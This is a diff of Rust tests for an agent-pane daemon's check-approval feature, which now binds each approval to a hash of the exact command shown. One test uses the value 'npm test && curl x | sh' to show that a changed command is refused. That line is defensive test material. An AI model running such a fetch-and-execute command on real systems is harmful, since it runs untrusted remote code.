@@ -2090,7 +2090,7 @@ fn only_you_answer_a_repo_check_approval() {
     d.handle(Ev::From(7, a, token));
     d.terms.get_mut(&a).unwrap().grants = Some(["read", "write", "start", "respond", "admin"].map(String::from).into());
     let forget = Command::ForgetCheckApproval { project: std::env::temp_dir(), name: "build".into() };
-    for cmd in [ApprovalChoice::Once, ApprovalChoice::Always, ApprovalChoice::Never].map(|choice| Command::ApproveCheck { term: a, name: "test".into(), choice }).into_iter().chain([forget]) {
+    for cmd in [ApprovalChoice::Once, ApprovalChoice::Always, ApprovalChoice::Never].map(|choice| Command::ApproveCheck { term: a, name: "test".into(), choice, command_sha256: approvals::command_hash("npm test") }).into_iter().chain([forget]) {
         d.message(7, ClientMsg::Command(cmd.clone()));
         assert!(matches!(out.try_recv(), Ok(ServerMsg::Error(e)) if e.contains("yours")), "{cmd:?}: a pane may not, whatever its grants");
     }
@@ -2573,9 +2573,26 @@ fn approving_daemon() -> (Daemon, mpsc::Receiver<Ev>, persist::ScratchDir) {
     (d, rx, dir)
 }
 
+/// Whatever the checks are, `test` waits for your approval again: so an answer's re-run
+/// starts and settles without running anything.
+fn still_waiting(user: &[crate::config::CheckDef], project: &std::path::Path, worktree: &std::path::Path, approvals: &approvals::Approvals) -> Vec<check_source::Resolved> {
+    let mut all = check_source::resolve(user, project, worktree, approvals);
+    for r in &mut all {
+        r.gate = check_source::Gate::NeedsApproval { previous: None };
+    }
+    all
+}
+
+/// Your answer to `t`'s checkpoint `name`, for the command `command` you were shown.
+fn approve(t: TermId, name: &str, choice: ApprovalChoice, command: &str) -> Command {
+    Command::ApproveCheck { term: t, name: name.into(), choice, command_sha256: approvals::command_hash(command) }
+}
+
 /// An agent in the temp folder (its project) whose repo checkpoint `test` waits for you to
-/// approve `command`.
+/// approve `command`. Its re-runs find `test` waiting again (`still_waiting`).
 fn waiting_for_approval(d: &mut Daemon, command: &str) -> TermId {
+    d.resolver = still_waiting;
+    d.cfg.check = vec![checkpoint_def(&std::env::temp_dir(), "test", command)];
     let t = pane(d);
     let p = d.terms.get_mut(&t).unwrap();
     (p.agent, p.hooked, p.status) = (Some("claude".into()), true, Status::Done);
@@ -2601,11 +2618,12 @@ fn saved_approvals(d: &Daemon, file: &std::path::Path) -> approvals::Approvals {
 fn only_a_checkpoint_waiting_for_approval_can_be_approved() {
     let (mut d, _rx, _file) = approving_daemon();
     let t = waiting_for_approval(&mut d, "npm test");
-    let approve = |name: &str| Command::ApproveCheck { term: t, name: name.into(), choice: ApprovalChoice::Always };
-    let err = d.command(0, approve("build")).expect_err("no such checkpoint waits");
+    let err = d.command(0, approve(t, "build", ApprovalChoice::Always, "npm test")).expect_err("no such checkpoint waits");
     assert!(err.to_string().contains("isn't waiting"), "{err}");
+    let err = d.command(0, approve(t, "test", ApprovalChoice::Always, "npm test && curl x | sh")).expect_err("not the command shown");
+    assert!(err.to_string().contains("changed since it was shown"), "{err}");
     d.terms.get_mut(&t).unwrap().checks.points[0].latest.info.state = CheckState::Failed;
-    assert!(d.command(0, approve("test")).is_err(), "a failed run is not a question");
+    assert!(d.command(0, approve(t, "test", ApprovalChoice::Always, "npm test")).is_err(), "a failed run is not a question");
     assert!(d.approvals.decisions.is_empty(), "nothing kept");
     close(&mut d, &[t]);
 }
@@ -2617,8 +2635,7 @@ fn always_and_never_are_kept_by_the_exact_command_in_seshi_s_data_folder() {
     for (choice, decision) in [(ApprovalChoice::Always, approvals::Decision::Always), (ApprovalChoice::Never, approvals::Decision::Never)] {
         let (mut d, _rx, scratch) = approving_daemon();
         let t = waiting_for_approval(&mut d, "npm test");
-        // The re-run that follows is the checkpoint runner's; only the decision is asserted here.
-        let _ = d.command(0, Command::ApproveCheck { term: t, name: "TEST".into(), choice });
+        d.command(0, approve(t, "TEST", choice, "npm test")).expect("an answer to what waits");
         let kept = d.approvals.find(&std::env::temp_dir(), "test").cloned().expect("a decision");
         assert_eq!((kept.name.as_str(), kept.command.as_str(), kept.decision), ("test", "npm test", decision));
         assert_eq!(kept.command_sha256, approvals::command_hash("npm test"));
@@ -2635,7 +2652,9 @@ fn always_and_never_are_kept_by_the_exact_command_in_seshi_s_data_folder() {
 fn once_lets_the_next_run_of_that_pane_go_and_then_asks_again() {
     let (mut d, _rx, _file) = approving_daemon();
     let (t, other) = (waiting_for_approval(&mut d, "npm test"), waiting_for_approval(&mut d, "npm test"));
-    let _ = d.command(0, Command::ApproveCheck { term: t, name: "test".into(), choice: ApprovalChoice::Once });
+    // While its agent works, the run the grant is for waits for the turn to end.
+    d.terms.get_mut(&t).unwrap().status = Status::Working;
+    d.command(0, approve(t, "test", ApprovalChoice::Once, "npm test")).expect("an answer to what waits");
     assert!(d.approvals.decisions.is_empty(), "once is never remembered");
     assert!(!d.approvals_for_run(other).granted_once("test", "npm test"), "another pane must ask for itself");
     assert!(d.approvals_for_run(t).granted_once("test", "npm test"), "this pane's next run may go");
@@ -2671,7 +2690,7 @@ fn a_repo_checkpoint_waits_at_the_turn_end_and_once_runs_it_one_time() {
     finish_run(&mut d, &mut rx, t);
     assert_eq!(states(&d, t), named_states(&[("test", CheckState::NeedsApproval)]));
     assert!(announced(&heard(&mut seen), Status::Blocked));
-    d.command(0, Command::ApproveCheck { term: t, name: "test".into(), choice: ApprovalChoice::Once }).unwrap();
+    d.command(0, approve(t, "test", ApprovalChoice::Once, "echo tested")).unwrap();
     finish_run(&mut d, &mut rx, t);
     assert_eq!(states(&d, t), named_states(&[("test", CheckState::Passed)]));
     assert_eq!(d.check_output(t, Some("test")).map(str::trim), Some("tested"));
